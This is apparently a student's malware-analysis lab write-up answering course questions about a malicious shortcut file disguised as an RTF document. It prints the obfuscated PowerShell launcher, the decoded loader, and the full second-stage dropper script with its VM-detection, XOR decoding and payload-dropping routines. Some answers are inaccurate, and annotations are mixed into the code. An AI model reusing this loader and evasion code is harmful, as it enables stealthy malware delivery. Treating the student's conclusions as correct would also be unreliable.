

1.What is the program that is executed by the link target of this file?
if we change the extension of that targeted file from .mal to .lnk. And check the properties we can get the following 
```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noni -ep bypass -win hidden $s = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('JG9zPTB4MDAwOWZkZGE7JG9lPTB4MDAwYTE5MTY7JGY9IjM3NDg2LXRoZS1zaG9ja2luZy10cnV0aC1hYm91dC1lbGVjdGlvbi1yaWdna
This data is incomplete if we use string on .mal file than we get the following strings.

`-noni -ep bypass -win hidden $s = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('JG9zPTB4MDAwOWZkZGE7JG9lPTB4MDAwYTE5MTY7JGY9IjM3NDg2LXRoZS1zaG9ja2luZy10cnV0aC1hYm91dC1lbGVjdGlvbi1yaWdnaW5nLWluLWFtZXJpY2EucnRmLmxuayI7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaWZkID0gTmV3LU9iamVjdCBJTy5GaWxlU3RyZWFtICRmLCdPcGVuJywnUmVhZCcsJ1JlYWRXcml0ZSc7JHggPSBOZXctT2JqZWN0IGJ5dGVbXSgkb2UtJG9zKTskaWZkLlNlZWsoJG9zLFtJTy5TZWVrT3JpZ2luXTo6QmVnaW4pOyRpZmQuUmVhZCgkeCwwLCRvZS0kb3MpOyR4PVtDb252ZXJ0XTo6RnJvbUJhc2U2NENoYXJBcnJheSgkeCwwLCR4Lkxlbmd0aCk7JHM9W1RleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRTdHJpbmcoJHgpO2lleCAkczs='));iex $s;`

We get the following decoded text 

$os=0x0009fdda;$oe=0x000a1916;
$f="37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk";
$ifd = New-Object IO.FileStream $f,'Open','Read','ReadWrite';
$x = New-Object byte[]($oe-$os);
$ifd.Seek($os,[IO.SeekOrigin]::Begin);
$ifd.Read($x,0,$oe-$os);
$x=[Convert]::FromBase64CharArray($x,0,$x.Length);
$s=[Text.Encoding]::ASCII.GetString($x);
iex $s;

This code tries tot read code from $os - $oe and write a new object then convert from base64 to text then invoke that code with iex.


without invoking that code if we were to print $s before iex $s

we get the following code that is extracted after base64decoding


FLARE-VM 08/29/2026 10:49:29
PS C:\Users\flare > $os=0x0009fdda;$oe=0x000a1916;
>> $f="C:\Users\flare\Desktop\Desktop\Labs\Malware Analysis Fundamentals\02 - Windows Management Technologies\37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk - Copy - Copy.mal_";
FLARE-VM 08/29/2026 10:50:49
PS C:\Users\flare > $ifd = New-Object IO.FileStream $f,'Open','Read','ReadWrite';
>> $x = New-Object byte[]($oe-$os);
FLARE-VM 08/29/2026 10:50:57
PS C:\Users\flare > $ifd.Seek($os,[IO.SeekOrigin]::Begin);
>> $ifd.Read($x,0,$oe-$os);
654810
6972
FLARE-VM 08/29/2026 10:51:03
PS C:\Users\flare > $x=[Convert]::FromBase64CharArray($x,0,$x.Length);
>> $s=[Text.Encoding]::ASCII.GetString($x);
FLARE-VM 08/29/2026 10:51:10
PS C:\Users\flare > $s


function pl_dropper ($ifd, $os, $len, $dpath) {
    $dpath = [Environment]::ExpandEnvironmentVariables($dpath)
    $pdir = Split-Path -Parent $dpath
    if ($pdir) {
        $b = Test-Path $pdir
    } else {
        $b = $True
    }

    if (!$b) {
         New-Item -ItemType directory -Path $pdir | out-null
    }

    $name = Split-Path -Leaf $dpath

    $pathlist = @($dpath, "%APPDATA%\$name", "%TEMP%\$name")
    ForEach ($dpath in $pathlist) {
        $dpath = [Environment]::ExpandEnvironmentVariables($dpath)

        try {
            $ofd = [IO.File]::Open($dpath, [IO.FileMode]::OpenOrCreate, [IO.FileAccess]::Write);
        } catch [Exception] {
            continue;
        }

        CopyFilePart $ifd $os $len $ofd

        $ofd.close()
        break
    }

    return $dpath
}

function CreateFile($path, $acc)
{
    $MethodDefinition = @'
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern Microsoft.Win32.SafeHandles.SafeFileHandle CreateFile(
        string fileName,
        [MarshalAs(UnmanagedType.U4)] System.IO.FileAccess fileAccess,
        [MarshalAs(UnmanagedType.U4)] System.IO.FileShare fileShare,
        IntPtr securityAttributes,
        [MarshalAs(UnmanagedType.U4)] System.IO.FileMode creationDisposition,
        [MarshalAs(UnmanagedType.U4)] System.IO.FileAttributes flags,
        IntPtr template);
'@

    $Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -Namespace 'Win32' -PassThru

    $handle = $Kernel32::CreateFile($path,
        $acc,
        [IO.FileShare]::ReadWrite,
        0,
        [IO.FileMode]::OpenOrCreate,
        [IO.FileAttributes]::Normal,
        0)

    $fs = New-Object IO.FileStream($handle, $acc)
    return $fs
}

function xor_decode($b, $l, $k) {
    for($i = 0; $i -lt $l; $i++) {
        $b[$i] = $b[$i] -bxor $k
    }
}

function CopyFilePart([IO.FileStream] $ifd, $os, $len, [IO.FileStream] $ofd)
{
    $tmpbuf = New-Object byte[] 8182
    $buflen = $tmpbuf.Length

    $ifd.Seek($os, [IO.SeekOrigin]::Begin) | out-null

    while ($len -gt 0) {
        $ifd.Read($tmpbuf, 0, $buflen) | out-null
        xor_decode $tmpbuf $buflen 0x41

        $ofd.Write($tmpbuf, 0, $buflen)
        $len -= $buflen
        if ($buflen -gt $len) {
            $buflen = $len
        }
    }
}

function get_susp_rating() {
    $score = 0

    $lst = gwmi -namespace root\cimv2 -query "SELECT * FROM Win32_BIOS"
    ForEach ($x in $lst) {
        $tmp = $x.SMBIOSBIOSVersion.ToLower()
        if ($tmp.contains("virtualbox") -or $tmp.contains("vmware")) { $score += 2 }

        $tmp = $x.SerialNumber.ToLower()
        if ($tmp.contains("vmware")) { $score += 2 }
    }
    //check if its a vmware/virtualbox

    $lst = gwmi -namespace root\cimv2 -query "SELECT * FROM Win32_PnPEntity"
    ForEach ($x in $lst) {
        if ($x.DeviceId.contains("PCI\VEN_80EE&DEV_CAFE")) { $score += 2}
    }
    PCI\VEN_80EE&DEV_CAFE is a virtual hardware ID belonging to Oracle VM VirtualBox, specifically representing a VirtualBox Guest Additions internal device or virtual PCI component (often handled by the VBoxGuest driver).

    if ($score -gt 2) {return $score}

        $myarr = @("user", "admin", "administrator", "user1")

    $lst = gwmi -namespace root\cimv2 -query "Select * from Win32_ComputerSystem"
    ForEach ($comp in $lst) {
        if (!$comp.PartOfDomain) {
            $score += 1
        }

        $tmp = $comp.UserName.ToLower()
        if ($tmp.contains("admin")) {
            $score += 2
        }

        ForEach ($x in $myarr) {
            if ($tmp.contains($x)) {
                $score += 1
            }
        }
    }
            check if its in a domain > user / admin / user1 

    if ($score -gt 2) {return $score}


    $myarr = @("procexp.exe", "taskmgr.exe", "wireshark.exe")

    $lst = gwmi -namespace root\cimv2 -query "SELECT * FROM Win32_Process"
    ForEach ($item in $lst) {
        $tmp = $item.ExecutablePath
        if (!$tmp) { $tmp = "" }
        $tmp = $tmp.ToLower()
        ForEach ($x in $myarr) {
            if ($tmp.contains($x)) {
                $score += 3
            }
        }
    }
    checks if any process is from given arraay is running.

    if ($score -gt 2) {return $score}

        $myarr = @("sample")

    $tmp = (Get-Item -Path ".\" -Verbose).FullName
    ForEach ($x in $myarr) {
        if ($tmp.contains($x)) {
            $score += 1
        }
    }
    $nm = Split-Path -Leaf $x
    $l = $nm.Split('.')[0].Length
    if ($l -eq 32 -or $l -eq 40 -or $l -eq 64) {
        $score += 3
    }
    return $score;
    check if its a sample -=> check text contain sample subtext in it
    and get the length of strings -> Maybe using it as hash

}

function heat_proc() {
    $s = 0
    For ($i=1; $i -lt 53; $i++) {
        $s += ($i + ($i * $s)) % $i
    }
    Exit 0
}

function detect_susp_environ() {
    $score = get_susp_rating
    if ($score -gt 3) {
        heat_proc
    }
}



$acc = [IO.FileAccess]::READ
$lnkfd = CreateFile "37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk" $acc;

detect_susp_environ

$os = 0x892e0
$l = 0x9fdda - $os

$fpath = pl_dropper $lnkfd $os $l "%TEMP%\37486-the-shocking-truth-about-election-rigging-in-america.rtf"

Invoke-Item "$fpath"


$os = 0x0dac
$l = 0x37ac - $os

$cfpath = pl_dropper $lnkfd $os $l "%APPDATA%\Skype\hqwsys.exe"

$os = 0x37ac
$len = 0x892e0 - $os

$ppath = pl_dropper $lnkfd $os $len "%TEMP%\1630357403074.png"

start "$cfpath"

```



Decoding the string we get the following



2. Compare the link target reported by Windows Explorer with the output
of strings. What cmdlet is used in the full link target to execute the
contents of the decoded Base64 text?
Powershell i sused to execute content of decoded string.


3. What is the purpose of the script code that is decoded and executed in the link target?
It writes a ps script with muliple fucntionalities included in the above given block.


How could the decoded script code in the link target be modified to
capture the next-stage script code instead of executing it?
Rather than executing the last block we can use it in powershell manually and get the script code.


The following questions focus on the decoded Powershell script. Ensure that
you have successfully captured the full script using the method you proposed
in Question 4 before proceeding.

5. What conditions does the get_susp_rating function derive from WMI to
determine whether to elevate the value of $score?
Checks the BIOS version and search if it's a vmware / virtualbox.


Bonus: What is the significance of 'PCI\VEN- 80EE&DEV- CAFE'?
PCI\VEN_80EE&DEV_CAFE is a virtual hardware ID belonging to Oracle VM VirtualBox, specifically representing a VirtualBox Guest Additions internal device or virtual PCI component (often handled by the VBoxGuest driver)..


Bonus: What are the non-WMI conditions which elevate the value of $score?
6. If the suspiciousness rating for the system exceeds 3, what does the script
do?
This code block get's executed which is return/exit the malware.
    if ($score -gt 2) {return $score}


7. What files are written to disk using the pl_dropper function?
It should be dynamically assesed to truly view the data
These following file are written to disk espeially accessing and modyfing data in %TEMP% & %APPDATA%.
```
$fpath = pl_dropper $lnkfd $os $l "%TEMP%\37486-the-shocking-truth-about-election-rigging-in-america.rtf"
$cfpath = pl_dropper $lnkfd $os $l "%APPDATA%\Skype\hqwsys.exe"
$ppath = pl_dropper $lnkfd $os $len "%TEMP%\1630357403074.png"   
```

8. What encoding scheme does pl_dropper use to decode file contents?
if we look at copy_file_part function we can see the use of following code
        xor_decode $tmpbuf $buflen 0x41
        so it's likely xor encoding scheme is used with key being '0x41'.


9. What is the purpose of the content inside the dropped RTF file?
The content inside the dropped rtf was encoded data probably for another payload
$os = 0x0dac
$l = 0x37ac - $os
To extract cerain part of code to extract for another program/executable after this.
$cfpath = pl_dropper $lnkfd $os $l "%APPDATA%\Skype\hqwsys.exe"

here the code section from $os - $l is extracted from  that rtf file. 

$os = 0x37ac
$len = 0x892e0 - $os

$ppath = pl_dropper $lnkfd $os $len "%TEMP%\1630357403074.png"      

this is to extract data from rtf file to png image.
